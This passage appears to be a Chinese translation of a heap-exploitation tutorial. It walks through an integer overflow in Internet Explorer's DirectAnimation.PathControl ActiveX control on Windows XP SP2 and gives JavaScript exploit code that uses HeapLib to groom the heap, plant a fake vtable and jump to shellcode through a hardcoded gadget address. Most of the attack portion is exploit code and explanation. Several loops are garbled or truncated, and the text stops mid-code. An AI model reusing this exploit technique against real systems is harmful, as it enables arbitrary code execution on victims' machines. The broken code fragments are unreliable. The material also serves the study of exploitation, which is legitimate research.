    heap.freeList(0x2020);
### Emptying the lookaside
要清空一个特定大小的lookaside列表，我们只需要分配足够大小的块。通常lookaside不超过4个块，但是我们已经在XP
SP2上看到了更多entry的lookaside。我们将分配100 块，只是用来验证是否是这样。
    for(var i = 0; i  0)
            for(i = 0; i  field_C和TimeFrameArray-> field_C的所有非NULL元素上调用虚函数
                if(KeyFrameArray.field_C[i] != NULL)
                    KeyFrameArray.field_C[i] -> func_8();
                if(TimeFrameArray.filed_C[i] != NULL)
                    TimeFrameArray.field_C -> func_8();
            }
         ...
         return err;
    }
KeyFrame函数将npoints参数乘以16,8和4，并分配四个缓冲区。如果npoints大于0x40000000，则分配大小将wrap
up，函数将分配四个小缓冲区。在我们的EXP中，我们将npoint设置为0x40000801，函数将分配大小为0x8018,0x4008的缓冲区和两个大小为0x200c的缓冲区。我们希望最小的缓冲区大于0x2000字节，因为小于0x2000的缓冲区分配将来自CMemManager堆而不是系统分配器。
在分配缓冲区之后，函数调用CSafeArrayOfDoublesAccessor ::
ToDoubleArray（）来初始化数组访问器对象。如果KeyFrameArray的大小小于npoints，ToDoubleArray将返回E_INAVLIDARG。在这种情况下执行的cleanup将遍历两个0x2004字节缓冲区，并在缓冲区中的每个非NULL元素上调用虚函数。
这些缓冲区被分配了HEAP_ZERO_MEMORY标志，并且只包含指针。然而，代码将从0到npoint（即0x40000801）进行迭代，并且最终将访问超过0x200c字节缓冲区末尾的数据。
如果我们控制KeyFrameArray.field_C缓冲区后面的第一个dword，我们就可以使它指向一个指向虚表中的一个指向shellcode的指针。调用func_8（）的虚函数将会执行我们的shellcode。
## Exploit
要利用这个漏洞，我们需要控制0x200c字节缓冲区之后的四个bytes。首先，我们将用大小为0x2010的块对堆进行碎片整理（内存分配器分配的内存对齐为8，所以0x200c取整为0x2010
）。然后我们将再分配两个0x2020字节的内存块，在偏移0x200c处写入假对象指针，并将它们释放到空闲列表中。
当KeyFrame函数分配两个0x200c字节的缓冲区时，内存分配器将重用我们大小为0x2020字节的块，清零第一个0x200c字节。KeyFrame函数末尾的cleanup循环将到0x200c偏移处的假对象指针，并将通过其虚表调用一个函数。列表中唯一的条目是我们的虚表。
调用虚函数的代码是：  
虚拟调用是通过ecx + 8，它将转移到执行IEXPLORE.EXE中的jump
ecx指令。指令跳回到vtable的开始处并且执行shellcode。有关vtable的更多详细信息，请参阅上一个部分。
完整的漏洞利用代码如下所示:
    //创建ActiveX 对象
    var target = new ActiveXObject("DirectAnimation.PathControl");
    //初始化HeapLib
    var heap = new heapLib.ie();
    //shellocde int 3
    var shellcode = unescape("%uCCCC");
    //IEXPLORE.EXE中jump ecx的地址
    var jmpecx = 0x4058b5;
    //用指向shellcode的指针构建一个伪造的虚表
    var vtable = heap.vtable(shellcode, jmpecx);
    //获得指向vtable的lookaside地址
    var fakeObjectPtr = heap.lookasideAddr(vtable);
    //使用伪造的对象地址构建堆块
    //len       padding             fake obj pointer    padding null
    //4 bytes      0x200C - 4 bytes     4bytes          14 bytes  2bytes
    var fakeObjectChunk = heap.padding((0x200c - 4)/2) + heap.addr(fakeObjectPtr) + heap.padding(14/2);
    heap.gc();
    heap.debugHeap(true);
    //清空lookaside
    heap.debug("Emptying the lookaside")
    for(var i = 0; i